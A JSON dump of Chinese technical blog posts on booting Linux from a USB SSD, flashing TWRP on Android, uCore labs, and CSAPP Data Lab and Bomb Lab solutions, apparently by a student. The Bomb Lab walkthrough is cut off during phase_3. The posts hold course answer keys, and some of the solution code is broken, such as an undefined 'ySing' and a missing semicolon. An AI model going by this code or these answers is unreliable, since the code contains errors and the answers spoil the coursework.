[{"content":"剁手前传 近来满脑子都是将Linux装在各种地方这件事情。折腾完mobile linux后又折腾openstick，最后却发现实在鸡肋——便携性合格但算力不足。遂转念想起刚刚购买的固态U盘，其性能完全满足了做系统盘的要求，装个Linux随身携带岂不美哉？但碍于手上这个梵想F395用料不佳，还存储了必要的数据，所以还是得下血本另行购买一个指标更优的固态U盘。思来想去还是忍痛下单了一直以来心心念念的CHIPFANCIER SE D\n价格较高但用料顶尖，还终身保固。使用MLC的颗粒，寿命和速度都得到了保证。\n自信装盘 这几年已经数不清装过多少次系统了。于是飞快地再次重复了一遍既有路径——只不过这次是将安装位置选择为固态U盘罢了。\nOK，重启计算机……直接进入新的Debian中。此时也不忘检查一下分区内容的正确性：\n1 2 3 4 root@debian ~# df -h Filesystem Size Used Avail Use% Mounted on /dev/sda2 / /dev/nvme0n1p2\t/boot/efi 我机敏地意识到了事情的不对劲：此次启动所用的引导分区位于nvme硬盘上，也就是另一块Windows系统盘的引导分区。\n不确信的结论：部分发行版在安装时，若发现磁盘（即使是不同的物理磁盘）上已有EFI分区，则不会重新创建EFI分区，而是将引导文件安装在已有EFI分区中\n这个好解决，重装一下系统，在配置分区时，手动指定对应分区即可解决。\n好了！再次启动！\n？？怎么又进Windows了？我手动指定的启动设备为固态U盘呀？\n奇怪的故障就要用非常手段——我直接拆掉的存放Windows的NVMe硬盘，再次启动！\n—— 屏幕乌漆嘛黑，HP的BIOS给我报了一个3F0的错误：Boot Device Not Found\n至此我对自己对波电脑城老板的信心受到重挫——简简单单的U盘系统我都做不好嘛😰\n回想起刚装好的第一次重启，是成功进入了U盘中的Debian的。说明根文件系统没有问题。那应该就是EFI分区中的问题了。\n尝试在BIOS中手动选择了引导文件为EFI/debian/grubx64.efi，果然启动成功了。\n遂破案：\nBIOS程序在EFI分区中寻找efi引导文件时，也是手持一个路径字典来寻找的。像大牌的Windows的引导文件在EFI分区中的路径EFI/Microsoft/Boot/bootmgfw.efi，肯定是被各家厂商的BIOS程序员重点关照的，各种BIOS都会来搜索这一路径。但区区Debian+grub，堂堂商业公司谁会来管你？所以我这台HP的BIOS根本就没来EFI/debian/grubx64.efi看一眼，就向我报告：没有可启动的分区，请安装操作系统。\n知道了原因，解决问题就不难了，阅毕：https://askubuntu.com/questions/244261/how-do-i-get-my-hp-laptop-to-boot-into-grub-from-my-new-efi-file\n可知，cp /boot/efi/EFI/debian/grubx64.efi /boot/efi/EFI/boot/bootx64.efi即可解决。\n虚拟环境启动 话说我折腾这些是想解决什么问题呢？\n公司的内网环境只能由域控下的Windows或MacOS接入，但日常的开发工作却又全都在Linux上，同时又不想使用虚拟磁盘，或是将公司电脑带去带来。那么就只能是在Windows host下使用第一类hypervisor启动我安装在固态U盘内的Linux系统了。\n这里还要注意的是，虽然目前vmware workstation已经可以和Microsoft hyper-v共存。但在开启了hyper-v的Windows上，vmware workstation是无法做到CPU直通的，因为 Intel-VT/AMD-V已被hyper-v占据。hyper-v作为第二类hypervisor，实际上会将Windows本身也进行虚拟化，造成性能折损。所以我一般都是直接停用hyper-v，代价则是WSL由此就不可用了。\n我们使用管理员权限启动vmware workstation（否则会导致没有直接访问磁盘硬件的权限），新建虚拟机时，选择使用物理磁盘而非虚拟磁盘：\n固件类型选择UEFI：\n同时做如下选择避免快照：\n即可成功启动：\n","date":"2022-09-13T15:45:25+08:00","image":"https://s2.loli.net/2022/09/13/kjqmNCfOILzuZgn.jpg","permalink":"https://cerr.cc/post/%E4%B8%80%E6%AC%A1u%E7%9B%98%E7%B3%BB%E7%BB%9F%E7%9B%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%AE%B0/","title":"一次U盘系统盘的折腾记"},{"content":"参考https://www.jianshu.com/p/d960a6f517d8\nFastboot 一个通信协议，用于直接向安卓手机Flash的不同分区中写入数据。\nhttps://android.googlesource.com/platform/system/core/+/refs/heads/master/fastboot/\n一般在bootloader中提供fastboot。连接电脑后可以执行fastboot命令。\nRecovery 一个单独的分区，内可包含一个恢复用的迷你系统，如TWRP。可以使用adb。\nTWRP 官网：https://twrp.me/\n于其中下载到对应手机型号所用TWRP镜像后，以USB调试模式连接到手机。\n使用adb重启手机到fastboot：\n1 adb reboot bootloader 刷入twrp镜像：\n1 fastboot flash recovery twrp.img 重启手机：\n1 fastboot reboot recovery 目前许多ROM会在第一次启动时重写recovery分区导致TWRP被官方recovery程序覆盖。所以我们要直接重启进入Recovery：\nNote many devices will replace your custom recovery automatically during first boot. To prevent this, use Google to find the proper key combo to enter recovery. After typing fastboot reboot, hold the key combo and boot to TWRP. Once TWRP is booted, TWRP will patch the stock ROM to prevent the stock ROM from replacing TWRP. If you don\u0026rsquo;t follow this step, you will have to repeat the install.\n安卓设备分区 https://source.android.com/devices/bootloader/partitions\n","date":"2022-09-05T16:56:14+08:00","image":"https://s2.loli.net/2022/09/13/u6ESQwpdvaU2igk.png","permalink":"https://cerr.cc/post/android%E6%90%9E%E6%9C%BA%E7%AC%94%E8%AE%B0/","title":"Android搞机笔记"},{"content":"","date":"2022-09-05T14:09:16+08:00","permalink":"https://cerr.cc/post/afl%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","title":"AFL源码分析"},{"content":" 第一次做uCore实验还是在大三末参加龙芯杯时。碍于当时水平不足，实验做的浅尝辄止、草草了事，似乎更多的是为了满足考核指标。何况当时还是向勇老师做指导教师，想来实在心怀愧疚。今日重做uCore Labs，为自己还一还当时欠下的账。\nLab0 知识环境准备 uCore是一套完整的操作系统内核教程，配套包含了教学视频、实验指导书、uCore内核源码以及实验代码。出发点如下：\nhttps://chyyuu.gitbooks.io/ucore_os_docs/content/\nLab0的内容为前置知识与环境配置\n我们来到Lab的git仓库：https://github.com/chyyuu/os_kernel_lab/tree/master\n注意以上实验书配套的仓库分支为master而非main：\ngithub已将默认分支名由master更变为main main分支为后来更新的rCore，而2020年前的uCore便保留在了master分支中 将实验代码clone至本地并切换分支：（或者为方便保留作业，可以fork一份）\n1 2 3 git clone https://github.com/chyyuu/os_kernel_lab.git cd os_kernel_lab git switch master 其余的前备知识于此不再赘述\nLab1 系统软件启动 传送门：https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_1_goals.html\n练习1 理解通过make生成执行文件的过程 传送门：https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_2_1_1_ex1.html\n学习记录：https://cerr.cc/post/zkv的cc-构建系统学习之路/\ngnu make官方文档：https://www.gnu.org/software/make/manual/html_node/index.html\n操作系统镜像文件ucore.img是如何一步一步生成的？ gnu make的一页版ASCII文档，方便Ctrl + F速查：https://www.gnu.org/software/make/manual/make.txt\nLab1 Makefile 涉及到的make关键词：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026#39;.SUFFIXES\u0026#39; The prerequisites of the special target \u0026#39;.SUFFIXES\u0026#39; are the list of suffixes to be used in checking for suffix rules. *Note Old-Fashioned Suffix Rules: Suffix Rules. \u0026#39;.DELETE_ON_ERROR\u0026#39; If \u0026#39;.DELETE_ON_ERROR\u0026#39; is mentioned as a target anywhere in the makefile, then \u0026#39;make\u0026#39; will delete the target of a rule if it has changed and its recipe exits with a nonzero exit status, just as it does when it receives a signal. *Note Errors in Recipes: Errors. 注释后的 Lab1 Makefile 如下 一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？ Lab2 物理内存管理 Lab3 虚拟内存管理 Lab4 内核线程管理 Lab5 用户进程管理 Lab6 调度器 Lab7 同步互斥 Lab8 文件系统 ","date":"2022-08-31T10:38:51+08:00","image":"https://s2.loli.net/2022/08/31/1oK4x5BTMAQhy9O.png","permalink":"https://cerr.cc/post/ucore-lab-writeup/","title":"uCore Lab WriteUp"},{"content":"0x0 实验源：http://csapp.cs.cmu.edu/3e/labs.html\n直接点击实验名视作以教师身份下载教学资源。题目文件应于Self-Study Handout下载\n原书pdf：https://github.com/Sorosliu1029/CSAPP-Labs/raw/master/Computer%20Systems%20A%20Programmers%20Perspective%20(3rd).pdf\nData Lab 下载解压题目文件：\n1 2 wget http://csapp.cs.cmu.edu/3e/datalab-handout.tar tar xvf datalab-handout.tar 题目说明：\nhttp://csapp.cs.cmu.edu/3e/README-datalab\n我们的任务是在受限使用运算符与控制流的前提下，实现bit.c中的每个函数的功能。\n实现异或运算 异或，即 “不同时为0” 且 “不同时为1”\n^，即 ~(~x\u0026amp;~y) 且 ~(x\u0026amp;y)\n1 2 3 4 5 6 7 8 9 10 11 //1 /* * bitXor - x^y using only ~ and \u0026amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026amp; * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~x\u0026amp;~y)\u0026amp;~(x\u0026amp;y); } 求32位下最小的补码数值 补码，二补数，2\u0026rsquo;s complement，参见：\nhttps://zh.wikipedia.org/zh-cn/%E4%BA%8C%E8%A3%9C%E6%95%B8\n32位下，最小的补码数值为1000000000000000000000000000000\n补码10000000为什么可以表示-128？而非0、128？参见：\nhttps://www.zhihu.com/question/28685048\n1 2 3 4 5 6 7 8 9 /* * tmin - return minimum two\u0026#39;s complement integer * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1 \u0026lt;\u0026lt; 31; } 判断输入是否是补码中的最大整数 32位下，补码中的最大整数是0x7fffffff，接下来省略一些，只写8bits，下文同理。\n核心手段是造出00000000，利用0与非0值返回true与false：\n若 x = 0111111\nx + 1 + x = 11111111\n~(x + 1 + x) = 00000000 = 0\n但同时需要排除 x = 11111111 的情况，因为此时 x + 1 + x 溢出后也得到 11111111\n故借助：\nx = 11111111 时 x + !(x + 1) = 0\nx = 01111111 时 x + !(x + 1) = 01111111 = !0\n来排除：\n1 2 3 4 5 6 7 8 9 10 /* * isTmax - returns 1 if x is the maximum, two\u0026#39;s complement number, * and 0 otherwise * Legal ops: ! ~ \u0026amp; ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { return !(~(x + 1 + x)) \u0026amp; (x + !(x + 1)); } 判断所有奇数位是否都为1 位的编号从0（最低有效）到31（最高有效）\n采用掩码，即当 x | 0x55555555 == 0xffffffff 时则返回1\n0x55 == 0b 0101 0101\n1 2 3 4 5 6 7 8 9 10 11 12 /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 2 */ int allOddBits(int x) { int a = (0x55 \u0026lt;\u0026lt; 0) | (0x55 \u0026lt;\u0026lt; 8) | (0x55 \u0026lt;\u0026lt; 16) | (0x55 \u0026lt;\u0026lt; 24); return !~(x | a); } 求 -x 按位取反加一即得负数\n补码实际上是一个阿贝尔群，对于 x，-x 是其补码，所以 -x 可以通过对 x 取反加1得到\n1 2 3 4 5 6 7 8 9 10 /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x + 1; } 判断是否为数字字符ASCII码 用减法，判断 x-0x30 \u0026gt;= 0 \u0026amp;\u0026amp; 0x39 - x \u0026gt;= 0\n但题干要求不能用减号，那么可以根据补码原理用加号实现减法\n最后判断两个中间值的符号位全为0即可返回true\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* * isAsciiDigit - return 1 if 0x30 \u0026lt;= x \u0026lt;= 0x39 (ASCII codes for characters \u0026#39;0\u0026#39; to \u0026#39;9\u0026#39;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) { int a = x + (~0x30 + 1); // x - 0x30 int b = 0x39 + (~x + 1); // 0x39 - x return !(a \u0026gt;\u0026gt; 31 | b \u0026gt;\u0026gt; 31); } 实现C语言 ? : 运算符 将x转化为 00000000 或 11111111 用于计算\n1 2 3 4 5 6 7 8 9 10 11 12 /* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 16 * Rating: 3 */ int conditional(int x, int y, int z) { x = !!x; x = ~x+1; return (x\u0026amp;y)|(~x\u0026amp;z); } 实现 \u0026lt;= 运算符 \u0026laquo;左移一律补0。\u0026raquo;右移可能补0也可能补符号位，视机器而定，通常是补符号位。\n通过位运算实现比较两个数的大小，两种情况：一是符号不同正数为大，二是符号相同看差值符号\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* * isLessOrEqual - if x \u0026lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 24 * Rating: 3 */ int isLessOrEqual(int x, int y) { int v = y + (~x+1); int vSignBit = (v \u0026gt;\u0026gt; 31) \u0026amp; 1; int xSign = x \u0026amp; (1\u0026lt;\u0026lt;31); int ySign = y \u0026amp; (1\u0026lt;\u0026lt;31); int signXor = (xSign ^ ySing) \u0026gt;\u0026gt; 31 \u0026amp; 1; return ((!signXor) \u0026amp; (!vSignBit)) | ((signXor) \u0026amp; (xSign\u0026gt;\u0026gt;31)); } 实现逻辑非! 00000000 ｜ (~00000000 + 1) 得 0，其余数做此运算都得非0，且符号位为1\n1 2 3 4 5 6 7 8 9 10 11 /* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 12 * Rating: 4 */ int logicalNeg(int x) { return ((x | (~x + 1)) \u0026gt;\u0026gt; 31) + 1 } 求一个数用补码表示所需的最少位数 正数则查找从左边第一个1开始，一直到最右边那一位的位数，再加上一个符号位\n负数则查找从左边第一个0开始，一直到最右边那一位的位数，再加上一个符号位\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* howManyBits - return the minimum number of bits required to represent x in * two\u0026#39;s complement * Examples: howManyBits(12) = 5 0......0 01100 * howManyBits(298) = 10 0.0 0100101010 * howManyBits(-5) = 4 1.......1 1011 * howManyBits(0) = 1 0..........0 0 * howManyBits(-1) = 1 1..........1 1 * howManyBits(0x80000000) = 32 10.........00 * Legal ops: ! ~ \u0026amp; ^ | + \u0026lt;\u0026lt; \u0026gt;\u0026gt; * Max ops: 90 * Rating: 4 */ int howManyBits(int x) { int bit16, bit8, bit4, bit2, bit1; // 对操作数取反，将负数转为正数，正数不变，便于更好的计算 int sign = x \u0026gt;\u0026gt; 31; x ^= sign; // 二分查找，先判断高16位有无存在1,并将范围缩小到高16位或低16位 // 如果高16位存在1,则bit16 == 16,否则等于0 bit16 = (!!(x \u0026gt;\u0026gt; 16)) \u0026lt;\u0026lt; 4; x \u0026gt;\u0026gt;= bit16; // 查找剩余16位中的高8位是否存在1 bit8 = (!!(x \u0026gt;\u0026gt; 8)) \u0026lt;\u0026lt; 3; x \u0026gt;\u0026gt;= bit8; // 查找剩余8位中的高4位是否存在1 bit4 = (!!(x \u0026gt;\u0026gt; 4)) \u0026lt;\u0026lt; 2; x \u0026gt;\u0026gt;= bit4; // 查找剩余4位中的高2位是否存在1 bit2 = (!!(x \u0026gt;\u0026gt; 2)) \u0026lt;\u0026lt; 1; x \u0026gt;\u0026gt;= bit2; // 查找剩余2位中的高1位是否存在1 bit1 = (!!(x \u0026gt;\u0026gt; 1)) \u0026lt;\u0026lt; 0; x \u0026gt;\u0026gt;= bit1; // 最终加上一个符号位 return bit16 + bit8 + bit4 + bit2 + bit1 + x + 1; } 求浮点数与2相乘的值 目前浮点数通常遵循IEEE 754标准，参见：\nhttps://zh.wikipedia.org/wiki/IEEE_754\n32位下，我们使用IEEE 754单精度浮点数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int\u0026#39;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ unsigned floatScale2(unsigned uf) { // 获取其exp部分的值 int exp = (uf \u0026gt;\u0026gt; 23) \u0026amp; 0xff; int sign = uf \u0026amp; (1 \u0026lt;\u0026lt; 31); // 如果传入的是非规格化的值 if(exp == 0) return sign | uf \u0026lt;\u0026lt; 1; // 如果传入的是无穷大或NaN else if(exp == 0xff) // 没法继续乘了，只能返回参数 return uf; //乘2 exp++; // 如果乘2后的结果超出范围（即溢出），则返回无穷大 if(exp == 0xff) return sign | 0x7f800000; // expr全为0, frac全为1 // 否则返回正常乘2后的值 return sign | (exp \u0026lt;\u0026lt; 23) | (uf \u0026amp; 0x7fffff); } 浮点数转整数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. also if, while * Max ops: 30 * Rating: 4 */ int floatFloat2Int(unsigned uf) { int exp = (uf \u0026gt;\u0026gt; 23) \u0026amp; 0xff; int sign = (uf \u0026gt;\u0026gt; 31) \u0026amp; 1; int frac = uf \u0026amp; 0x7fffff; int shiftBits = 0; // 0比较特殊，先判断0(正负0都算作0) if(!(uf \u0026amp; 0x7fffffff)) return 0; // 判断是否为NaN还是无穷大 if(exp == 0xff) return 0x80000000u; // 指数减去偏移量，获取到真正的指数 exp -= 127; // 需要注意的是，原来的frac一旦向左移位，其值就一定会小于1，所以返回0 if(exp \u0026lt; 0) return 0; // 获取M，注意exp等于-127和不等于-127的情况是不一样的。当exp != -127时还有一个隐藏的1 if(exp != -127) frac |= (1 \u0026lt;\u0026lt; 23); // 要移位的位数。注意float的小数点是点在第23位与第22位之间 shiftBits = 23 - exp; // 需要注意一点，如果指数过大，则也返回0x80000000u if(shiftBits \u0026lt; 31 - 23) return 0x80000000u; // 获取真正的结果 frac \u0026gt;\u0026gt;= shiftBits; // 判断符号 if(sign == 1) return ~frac + 1; else return frac; } 求2.0的x次方 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, \u0026amp;\u0026amp;. Also if, while * Max ops: 30 * Rating: 4 */ unsigned floatPower2(int x) { // 得到偏移后的指数exp int exp = x + 127; // 如果exp大于等于255则为无穷大或越界 if(exp \u0026gt; 0xfe) return 0x7f800000; // exp为0时，结果为0 else if(exp \u0026lt; 0) return 0; //因为是求结果的浮点数比特级表示，所以偏移后的指数直接左移23bits即可 return exp \u0026lt;\u0026lt; 23; } Bomb Lab Bomb Lab，gdb拆弹实验。题干给定了一个炸弹程序，和它的部分源码。我们需要做的是通过动态调试，还原6个密码并正确输入，避免炸弹爆炸。否则下场就是：\n1 2 3 4 5 6 7 ▶ ./bomb Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Yaleyale! I don\u0026#39;t give a shit!!! BOOM!!! The bomb has blown up. 好了，正儿八经来拆拆看，直接上钳子：gdb bomb\n通过bomb.c可知，我们可以将找出的密码写入文件中供bomb读取，方便做题\nphase_1 炸弹1：\n1 2 3 4 5 6 7 8 9 pwndbg\u0026gt; b phase_1 Breakpoint 1 at 0x400ee0 pwndbg\u0026gt; r Starting program: /home/zkv/Gitrepos/A-B_Problem/csapp/BombLab/bomb [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! AAAAAAAA 直接在第一关下断点，随便输个字符串AAAAAAAA，接着向下走两步到校验的位置\n1 2 3 4 5 6 7 0x400ee0 \u0026lt;phase_1\u0026gt; sub rsp, 8 0x400ee4 \u0026lt;phase_1+4\u0026gt; mov esi, 0x402400 ► 0x400ee9 \u0026lt;phase_1+9\u0026gt; call strings_not_equal \u0026lt;strings_not_equal\u0026gt; rdi: 0x603780 (input_strings) ◂— \u0026#39;AAAAAAAA\u0026#39; rsi: 0x402400 ◂— outsd dx, dword ptr [rsi] /* \u0026#39;Border relations with Canada have never been better.\u0026#39; */ rdx: 0x1 rcx: 0x8 可知第一关密码为：Border relations with Canada have never been better.\n写入密码本：echo \u0026quot;Border relations with Canada have never been better.\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_2 用密码本直接来到第二关：gdb --args bomb passcodes\n1 2 3 4 5 6 7 8 9 10 pwndbg\u0026gt; b phase_2 Breakpoint 1 at 0x400efc pwndbg\u0026gt; r Starting program: /home/zkv/Gitrepos/A-B_Problem/csapp/BombLab/bomb passcodes [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day! Phase 1 defused. How about the next one? AAAAAAAA 向下跟踪到第二关的校验逻辑中。首先是从我们输入的字符串中读取6个数字：\n1 2 3 4 ► 0x40148a \u0026lt;read_six_numbers+46\u0026gt; call __isoc99_sscanf@plt \u0026lt;__isoc99_sscanf@plt\u0026gt; s: 0x6037d0 (input_strings+80) ◂— \u0026#39;AAAAAAAA\u0026#39; format: 0x4025c3 ◂— \u0026#39;%d %d %d %d %d %d\u0026#39; vararg: 0x7fffffffe070 —▸ 0x7fffffffe1c8 —▸ 0x7fffffffe4d5 ◂— \u0026#39;/home/zkv/Gitrepos/A-B_Problem/csapp/BombLab/bomb\u0026#39; 接着回到phase_2函数中进行校验：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pwndbg\u0026gt; disassemble Dump of assembler code for function phase_2: 0x0000000000400efc \u0026lt;+0\u0026gt;: push rbp 0x0000000000400efd \u0026lt;+1\u0026gt;: push rbx 0x0000000000400efe \u0026lt;+2\u0026gt;: sub rsp,0x28 0x0000000000400f02 \u0026lt;+6\u0026gt;: mov rsi,rsp 0x0000000000400f05 \u0026lt;+9\u0026gt;: call 0x40145c \u0026lt;read_six_numbers\u0026gt; 0x0000000000400f0a \u0026lt;+14\u0026gt;: cmp DWORD PTR [rsp],0x1 0x0000000000400f0e \u0026lt;+18\u0026gt;: je 0x400f30 \u0026lt;phase_2+52\u0026gt; 0x0000000000400f10 \u0026lt;+20\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400f15 \u0026lt;+25\u0026gt;: jmp 0x400f30 \u0026lt;phase_2+52\u0026gt; =\u0026gt; 0x0000000000400f17 \u0026lt;+27\u0026gt;: mov eax,DWORD PTR [rbx-0x4] 0x0000000000400f1a \u0026lt;+30\u0026gt;: add eax,eax 0x0000000000400f1c \u0026lt;+32\u0026gt;: cmp DWORD PTR [rbx],eax 0x0000000000400f1e \u0026lt;+34\u0026gt;: je 0x400f25 \u0026lt;phase_2+41\u0026gt; 0x0000000000400f20 \u0026lt;+36\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400f25 \u0026lt;+41\u0026gt;: add rbx,0x4 0x0000000000400f29 \u0026lt;+45\u0026gt;: cmp rbx,rbp 0x0000000000400f2c \u0026lt;+48\u0026gt;: jne 0x400f17 \u0026lt;phase_2+27\u0026gt; 0x0000000000400f2e \u0026lt;+50\u0026gt;: jmp 0x400f3c \u0026lt;phase_2+64\u0026gt; 0x0000000000400f30 \u0026lt;+52\u0026gt;: lea rbx,[rsp+0x4] 0x0000000000400f35 \u0026lt;+57\u0026gt;: lea rbp,[rsp+0x18] 0x0000000000400f3a \u0026lt;+62\u0026gt;: jmp 0x400f17 \u0026lt;phase_2+27\u0026gt; 0x0000000000400f3c \u0026lt;+64\u0026gt;: add rsp,0x28 0x0000000000400f40 \u0026lt;+68\u0026gt;: pop rbx 0x0000000000400f41 \u0026lt;+69\u0026gt;: pop rbp 0x0000000000400f42 \u0026lt;+70\u0026gt;: ret \u0026lt;+27\u0026gt;到\u0026lt;+41\u0026gt;之间为循环校验的逻辑。具体是比较DWORD PTR [rbx]是否等于(DWORD PTR [rbx-0x4]) * 2。而每一轮循环中DWORD PTR [rbx]存放的就是我们输入的数字。比如第一轮循环：\n1 2 pwndbg\u0026gt; x $rbx-4 0x7fffffffe070: 0x00000001 那第二轮循环就应该：\n1 2 pwndbg\u0026gt; x $rbx-4 0x7fffffffe070: 0x00000002 所以我们输入：1 2 4 8 16 32即可通关\necho \u0026quot;1 2 4 8 16 32\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_3 用密码本直接来到第三关：gdb -ex \u0026quot;b phase_3\u0026quot; -ex \u0026quot;r\u0026quot; --args bomb passcodes\n反汇编看看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 pwndbg\u0026gt; disassemble phase_3 Dump of assembler code for function phase_3: =\u0026gt; 0x0000000000400f43 \u0026lt;+0\u0026gt;: sub rsp,0x18 0x0000000000400f47 \u0026lt;+4\u0026gt;: lea rcx,[rsp+0xc] 0x0000000000400f4c \u0026lt;+9\u0026gt;: lea rdx,[rsp+0x8] 0x0000000000400f51 \u0026lt;+14\u0026gt;: mov esi,0x4025cf 0x0000000000400f56 \u0026lt;+19\u0026gt;: mov eax,0x0 0x0000000000400f5b \u0026lt;+24\u0026gt;: call 0x400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 0x0000000000400f60 \u0026lt;+29\u0026gt;: cmp eax,0x1 0x0000000000400f63 \u0026lt;+32\u0026gt;: jg 0x400f6a \u0026lt;phase_3+39\u0026gt; 0x0000000000400f65 \u0026lt;+34\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400f6a \u0026lt;+39\u0026gt;: cmp DWORD PTR [rsp+0x8],0x7 0x0000000000400f6f \u0026lt;+44\u0026gt;: ja 0x400fad \u0026lt;phase_3+106\u0026gt; 0x0000000000400f71 \u0026lt;+46\u0026gt;: mov eax,DWORD PTR [rsp+0x8] 0x0000000000400f75 \u0026lt;+50\u0026gt;: jmp QWORD PTR [rax*8+0x402470] 0x0000000000400f7c \u0026lt;+57\u0026gt;: mov eax,0xcf 0x0000000000400f81 \u0026lt;+62\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f83 \u0026lt;+64\u0026gt;: mov eax,0x2c3 0x0000000000400f88 \u0026lt;+69\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f8a \u0026lt;+71\u0026gt;: mov eax,0x100 0x0000000000400f8f \u0026lt;+76\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f91 \u0026lt;+78\u0026gt;: mov eax,0x185 0x0000000000400f96 \u0026lt;+83\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f98 \u0026lt;+85\u0026gt;: mov eax,0xce 0x0000000000400f9d \u0026lt;+90\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400f9f \u0026lt;+92\u0026gt;: mov eax,0x2aa 0x0000000000400fa4 \u0026lt;+97\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400fa6 \u0026lt;+99\u0026gt;: mov eax,0x147 0x0000000000400fab \u0026lt;+104\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400fad \u0026lt;+106\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400fb2 \u0026lt;+111\u0026gt;: mov eax,0x0 0x0000000000400fb7 \u0026lt;+116\u0026gt;: jmp 0x400fbe \u0026lt;phase_3+123\u0026gt; 0x0000000000400fb9 \u0026lt;+118\u0026gt;: mov eax,0x137 0x0000000000400fbe \u0026lt;+123\u0026gt;: cmp eax,DWORD PTR [rsp+0xc] 0x0000000000400fc2 \u0026lt;+127\u0026gt;: je 0x400fc9 \u0026lt;phase_3+134\u0026gt; 0x0000000000400fc4 \u0026lt;+129\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000400fc9 \u0026lt;+134\u0026gt;: add rsp,0x18 0x0000000000400fcd \u0026lt;+138\u0026gt;: ret 阅读反汇编代码可知，此关需输入两个数字。第一个数字需小于7，第二个数字的值由输入的第一个数字推导得出（switch case结构）。第一个数字输入为1，来到：\n1 2 3 4 5 6 0x400f71 \u0026lt;phase_3+46\u0026gt; mov eax, dword ptr [rsp + 8] 0x400f75 